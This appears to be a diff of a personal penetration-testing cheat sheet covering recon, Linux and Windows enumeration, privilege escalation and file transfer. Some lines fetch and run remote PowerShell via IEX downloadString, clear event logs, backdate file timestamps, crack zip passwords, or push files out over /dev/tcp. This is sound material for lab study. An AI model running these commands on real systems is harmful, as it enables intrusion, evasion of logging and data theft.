@@ -1,34 +1,3 @@
-1.	Penetration Patterns	2
-2.	My flow	2
-3.	Enumeration tools	5
-4.	Linux OS	6
-5.	Windows OS	7
-6.	Ports information	8
-7.	Web exploits	15
-8.	Post-Exploitation && Privilege escalation	20
-8.1.	Linux	20
-8.1.1.	SUID/SGID	20
-8.1.2.	sudo	21
-8.1.3.	capability	21
-8.1.4.	cron	21
-8.1.5.	Writable folder	22
-8.1.6.	Dot in path	22
-8.1.7.	Vulnerable software and services	22
-8.1.8.	Logs/stuff	23
-8.1.9.	Manual	25
-8.1.10.	Auto tools	27
-8.1.11.	Restricted Shell escape	27
-8.1.12.	nc interactive shell        #use without rlwrap	28
-8.2.	Windows	28
-8.2.1.	UAC Bypass	35
-8.2.2.	Passing another user's creds	38
-8.2.3.	Saving Creds	38
-8.2.4.	Juicy Potato   - Golden privilege	38
-9.	Tunneling	41
-10.	RE stuff	42
-11.	Extra info	43
-
- 
 
 1.	Penetration Patterns
    1. Reconnaissance    # Identifying IP address, ports, services running
@@ -40,205 +9,206 @@
       
 2.	My flow
 Tmux screen 1: ./nmapAutomator <ip> All
-Tmux screen 2: nmap -sC -sV -sT -p- <ip>
+Tmux screen 2: sleep 600; autorecon ip
 
 Web
 	gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 30
 	wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
 
 Linux
-for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
-for i in {1..254}; do nc -nvzw1 192.168.28.$i 21 22 23 ;done
+	Quick ping
+		for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+		for i in {1..254}; do nc -nvzw1 192.168.28.$i 21 22 23 ;done
 
 
-ps $$
-cd ~
-which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
-cat /etc/passwd
-sudo -l
-su <other user> - 
-find / -perm /4000 -ls 2>/dev/null        
-find / -perm /2000 -ls 2>/dev/null
-find . -ls -type -f
-id
-ps aux
-ps -elf
-ps -eo user,command,pid
-automated tools
+	ps $$
+	cd ~
+	which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+	cat /etc/passwd
+	sudo -l
+	su <other user> - 
+	find / -perm /4000 -ls 2>/dev/null        
+	find / -perm /2000 -ls 2>/dev/null
+	find . -ls -type -f
+	id
+	ps aux
+	ps -elf
+	ps -eo user,command,pid
+	automated tools
 
-Windows
-Hidden   (ADS)
- 
-	dir /r
-	dir -force
-	notepad kids:hidden.txt 
-	get-content .\reminder.txt 
-	get-content .\reminder.txt -Stream secret.info 
-	gc .\reminder.txt:secret.info 
-	gc .\test.txt 
-	gc .\text.txt -stream secret.vbs 
-	notepad .\test.txt:secret.vbs 
-	wscript .\test.txt:secret.vbs 
-	get-filehash .\test.txt -algorithm md5 
-	powershell(get-content <file> -Stream <stream name>)
-	powershell(get-content <file> -Stream <stream name>).substring(0,16)
-	
-scheduled tasks (schtasks, strat from top)
-schtasks /query /fo LIST /v
-schtasks /query /fo LIST /v | Select-String -Pattern "SYSTEM" -CaseSensitive -Context 5,0 | Select-String -Pattern "Task to Run"
-	
-	
-	process (tasklist /v)
-tasklist /SVC
-tasklist /v
-tasklist /svc |find /i "pid"
-	
-	
-	services (wmic, sc qc, services with no description)
-get-service
-get-service |where {$_.status -eq running}
-for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
-services.msc --> search for items without description.
-reg query HKLM\system\currentcontrolset\services\ /s /v imagerpath |select-string -pattern "imagepath" -casesensitive |select-string -pattern "system32" -notmatch                
-sc qc <service>     #get more information about service
-wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
-wmic service list full
+	Windows
+	Hidden   (ADS)
+
+		dir /r
+		dir -force
+		notepad kids:hidden.txt 
+		get-content .\reminder.txt 
+		get-content .\reminder.txt -Stream secret.info 
+		gc .\reminder.txt:secret.info 
+		gc .\test.txt 
+		gc .\text.txt -stream secret.vbs 
+		notepad .\test.txt:secret.vbs 
+		wscript .\test.txt:secret.vbs 
+		get-filehash .\test.txt -algorithm md5 
+		powershell(get-content <file> -Stream <stream name>)
+		powershell(get-content <file> -Stream <stream name>).substring(0,16)
+
+	scheduled tasks (schtasks, strat from top)
+	schtasks /query /fo LIST /v
+	schtasks /query /fo LIST /v | Select-String -Pattern "SYSTEM" -CaseSensitive -Context 5,0 | Select-String -Pattern "Task to Run"
 
 
-	
-	
-	Auditpol(Be admin)
-auditpol /get/category:*
-auditpol /get /category:* |findstr /i "success failure"
-auditpol /list /subcategory:"detailed Tracking","DS Access"
+		process (tasklist /v)
+	tasklist /SVC
+	tasklist /v
+	tasklist /svc |find /i "pid"
 
-Event logGING
-storage
-C:\windows\system32\config\filetype.evtx/.evt
-webtutile el
-wmic ntevent where "logfile="<LOGNAME>" list full
-Get-Eventlog -List
-Determine PS version (bunch of ways)
-reg query hklm\software\microsoft\powershell\3\powershellengine\
-powershell -command "$psversiontable
 
-reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
-reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
-    # 0 = no | 1 = errors | 2 = verbose
+		services (wmic, sc qc, services with no description)
+	get-service
+	get-service |where {$_.status -eq running}
+	for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
+	services.msc --> search for items without description.
+	reg query HKLM\system\currentcontrolset\services\ /s /v imagerpath |select-string -pattern "imagepath" -casesensitive |select-string -pattern "system32" -notmatch                
+	sc qc <service>     #get more information about service
+	wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+	wmic service list full
 
 
 
 
+		Auditpol(Be admin)
+	auditpol /get/category:*
+	auditpol /get /category:* |findstr /i "success failure"
+	auditpol /list /subcategory:"detailed Tracking","DS Access"
 
-	registry (RUN/RUN ONCE)
-                  Run keys, Run once keys 
-reg query HKLM\software\microsoft\windows\currentversion\run 
-reg query HKCU\software\microsoft\windows\currentversion\run 
-                  Run Once keys  # run once and remove itself.  
-reg query HKLM\software\microsoft\windows\currentversion\runOnce 
-reg query HKCU\software\microsoft\windows\currentversion\runOnce 
-                  service = process runs on background. svchost.  
-reg query HKLM\system\currentcontrolset\services 
-reg query HKLM\software\microsoft\windows NT\currentversion\winlogon 
-reg query HKLM\software\microsoft\windows\currentversion\explore\shell folders 
-reg query HKLM\software\microsoft\windows\currentversion\explore\user shell folders 
-	UAC setting
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+	Event logGING
+	storage
+	C:\windows\system32\config\filetype.evtx/.evt
+	webtutile el
+	wmic ntevent where "logfile="<LOGNAME>" list full
+	Get-Eventlog -List
+	Determine PS version (bunch of ways)
+	reg query hklm\software\microsoft\powershell\3\powershellengine\
+	powershell -command "$psversiontable
+
+	reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
+	reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
+	    # 0 = no | 1 = errors | 2 = verbose
 
 
 
-Determine if logging is set (PowerShell and WMIC)
-reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
-reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
-# 0 = no | 1 = errors | 2 = verbose
 
-WMIC Log Storage:
-%systemroot%\system32\wbem\Logs\``               
-                   
- Find Files and Alter File attributes:
-forfiles /P c:\windows\system32 /S /D +05/14/2019
-wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
-copy /b filename.ext +,,
-$(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")
-Clear Event Logs:
-wevtutil clear-log Application
-Clear-Eventlog -Log Application, System
-Check event viewer
-open event viewer
-go to filter current log --> xml to see the format
-wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=104 or EventID=7040)]]"
-Microsoft Event IDs (Some Important Ones)
-4624/4625 successful/failed login
-4720 account created
-4672 administrator equivalent user logs on
-7045 Service creation
-wmic neteventlog get name
 
-automated tools
-         powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }" 
-	 	Privilege   : SeImpersonatePrivilege      --> Rotten potato will work
-         powershell -exec bypass -command "& { Import-Module .\39719.ps1; Invoke-MS16-032; }" 
-	 Invoke-Runas.ps1 -User <username> -Password <Password> -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -Args "IEX(New-object net.webclient).downloadString('http://ip/file.ps1')"
-	 Invoke-Runas.ps1 -User <username> -Password <Password> -LogonType 0x1 -Binary c:\windows\system32\windowspowershell\v1.0\powershell.exe -Args "IEX(New-object net.webclient).downloadString('http://ip/file.ps1')"
+		registry (RUN/RUN ONCE)
+			  Run keys, Run once keys 
+	reg query HKLM\software\microsoft\windows\currentversion\run 
+	reg query HKCU\software\microsoft\windows\currentversion\run 
+			  Run Once keys  # run once and remove itself.  
+	reg query HKLM\software\microsoft\windows\currentversion\runOnce 
+	reg query HKCU\software\microsoft\windows\currentversion\runOnce 
+			  service = process runs on background. svchost.  
+	reg query HKLM\system\currentcontrolset\services 
+	reg query HKLM\software\microsoft\windows NT\currentversion\winlogon 
+	reg query HKLM\software\microsoft\windows\currentversion\explore\shell folders 
+	reg query HKLM\software\microsoft\windows\currentversion\explore\user shell folders 
+		UAC setting
+	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+
+
+	Determine if logging is set (PowerShell and WMIC)
+	reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
+	reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
+	# 0 = no | 1 = errors | 2 = verbose
+
+	WMIC Log Storage:
+	%systemroot%\system32\wbem\Logs\``               
+
+	 Find Files and Alter File attributes:
+	forfiles /P c:\windows\system32 /S /D +05/14/2019
+	wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
+	copy /b filename.ext +,,
+	$(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")
+	Clear Event Logs:
+	wevtutil clear-log Application
+	Clear-Eventlog -Log Application, System
+	Check event viewer
+	open event viewer
+	go to filter current log --> xml to see the format
+	wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=104 or EventID=7040)]]"
+	Microsoft Event IDs (Some Important Ones)
+	4624/4625 successful/failed login
+	4720 account created
+	4672 administrator equivalent user logs on
+	7045 Service creation
+	wmic neteventlog get name
+
+	automated tools
+		 powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }" 
+			Privilege   : SeImpersonatePrivilege      --> Rotten potato will work
+		 powershell -exec bypass -command "& { Import-Module .\39719.ps1; Invoke-MS16-032; }" 
+		 Invoke-Runas.ps1 -User <username> -Password <Password> -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -Args "IEX(New-object net.webclient).downloadString('http://ip/file.ps1')"
+		 Invoke-Runas.ps1 -User <username> -Password <Password> -LogonType 0x1 -Binary c:\windows\system32\windowspowershell\v1.0\powershell.exe -Args "IEX(New-object net.webclient).downloadString('http://ip/file.ps1')"
 
 
 
                          
 3.	Enumeration tools
 3.1.	Nmap: 
-nmap -sC -sV -oN nmap.txt <ip> -p-
-locate 
-grep -r categories /usr/share/nmap/scripts/*.nse |grep -oP '".*?"' |sort -u
-locate <keywords> |grep .nse$      #search for nmap script
-                To user nmap scripts
-               git clone https://github.com/vulnersCom/nmap-vulners.git
-               cp *.nse /usr/share/nmap/scripts
-               nmap --script-updatedb
+		nmap -sC -sV -oN nmap.txt <ip> -p-
+		locate 
+		grep -r categories /usr/share/nmap/scripts/*.nse |grep -oP '".*?"' |sort -u
+		locate <keywords> |grep .nse$      #search for nmap script
+				To user nmap scripts
+			       git clone https://github.com/vulnersCom/nmap-vulners.git
+			       cp *.nse /usr/share/nmap/scripts
+			       nmap --script-updatedb
 
-3.2.	 nmapAutomator  
-        './nmapAutomator full ip'
-        https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
-3.3.	AutoRecon — https://github.com/Tib3rius/AutoRecon
-3.4 	Tcpdump 
-		tcpdump via ssh 
-			ssh id@ip "/usr/bin/tcpdump -i <interface> -U -s0 -w - '<specification e.g. port 22>'" >somename.cap"
-			wireshark somename.cap
-			OR
-			
-			ssh id@ip "/usr/bin/tcpdump -i <interface> -U -s0 -w - '<specification e.g. port 22>'" >somename.cap" |wireshark -k -i -
-			
-			
+	3.2.	 nmapAutomator  
+		'./nmapAutomator full ip'
+		https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
+	3.3.	AutoRecon — https://github.com/Tib3rius/AutoRecon
+	3.4 	Tcpdump 
+			tcpdump via ssh 
+				ssh id@ip "/usr/bin/tcpdump -i <interface> -U -s0 -w - '<specification e.g. port 22>'" >somename.cap"
+				wireshark somename.cap
+				OR
+
+				ssh id@ip "/usr/bin/tcpdump -i <interface> -U -s0 -w - '<specification e.g. port 22>'" >somename.cap" |wireshark -k -i -
+
+
                
 4.	 Linux OS
-Look for example
-curl cht.sh/<command>
-vi/vim trick
-:s/foo/bar/g 	Change each 'foo' to 'bar' in the current line.
-:%s/foo/bar/g 	Change each 'foo' to 'bar' in all the lines.
-:5,12s/foo/bar/g 	Change each 'foo' to 'bar' for all lines from line 5 to line 12 (inclusive).
-:'a,'bs/foo/bar/g 	Change each 'foo' to 'bar' for all lines from mark a to mark b inclusive (see Note below).
-:'<,'>s/foo/bar/g 	When compiled with +visual, change each 'foo' to 'bar' for all lines within a visual selection. Vim automatically appends the visual selection range ('<,'>) for any ex command when you select an area and enter :. Also, see Note below.
-:.,$s/foo/bar/g 	Change each 'foo' to 'bar' for all lines from the current line (.) to the last line ($) inclusive.
-	:.,+2s/foo/bar/g 	Change each 'foo' to 'bar' for the current line (.) and the two next lines (+2).
-:g/^baz/s/foo/bar/g 	Change each 'foo' to 'bar' in each line starting with 'baz'. 
-search for a string
-	 	grep -rnw '/path/to/somewhere/' -e 'pattern'
-		grep -Ri password .
-unzip with encryption
-	 	fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace
-File transfer tools
-Impacket (SMB, psexec, etc) — https://github.com/SecureAuthCorp/impacket
-host:     impacket-smbserver pkong .      
-target:  
-net use \\<IP>\pkong
-copy \\<IP>\pkong\file .
-  New-PSDrive -name "something" -PSProvider "FileSystem" -Root "\\<ip>\<folder_name>
-  cd something:
-Using /dev/tcp
-	sender: 
-		cat <file>  > /dev/tcp/<ip>/<port>
-	receiver
-		nc -nlvp <port>
+	Look for example
+	curl cht.sh/<command>
+	vi/vim trick
+	:s/foo/bar/g 	Change each 'foo' to 'bar' in the current line.
+	:%s/foo/bar/g 	Change each 'foo' to 'bar' in all the lines.
+	:5,12s/foo/bar/g 	Change each 'foo' to 'bar' for all lines from line 5 to line 12 (inclusive).
+	:'a,'bs/foo/bar/g 	Change each 'foo' to 'bar' for all lines from mark a to mark b inclusive (see Note below).
+	:'<,'>s/foo/bar/g 	When compiled with +visual, change each 'foo' to 'bar' for all lines within a visual selection. Vim automatically appends the visual selection range ('<,'>) for any ex command when you select an area and enter :. Also, see Note below.
+	:.,$s/foo/bar/g 	Change each 'foo' to 'bar' for all lines from the current line (.) to the last line ($) inclusive.
+		:.,+2s/foo/bar/g 	Change each 'foo' to 'bar' for the current line (.) and the two next lines (+2).
+	:g/^baz/s/foo/bar/g 	Change each 'foo' to 'bar' in each line starting with 'baz'. 
+	search for a string
+			grep -rnw '/path/to/somewhere/' -e 'pattern'
+			grep -Ri password .
+	unzip with encryption
+			fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace
+	File transfer tools
+	Impacket (SMB, psexec, etc) — https://github.com/SecureAuthCorp/impacket
+	host:     impacket-smbserver pkong .      
+	target:  
+	net use \\<IP>\pkong
+	copy \\<IP>\pkong\file .
+	  New-PSDrive -name "something" -PSProvider "FileSystem" -Root "\\<ip>\<folder_name>
+	  cd something:
+	Using /dev/tcp
+		sender: 
+			cat <file>  > /dev/tcp/<ip>/<port>
+		receiver
+			nc -nlvp <port>
 
   
   
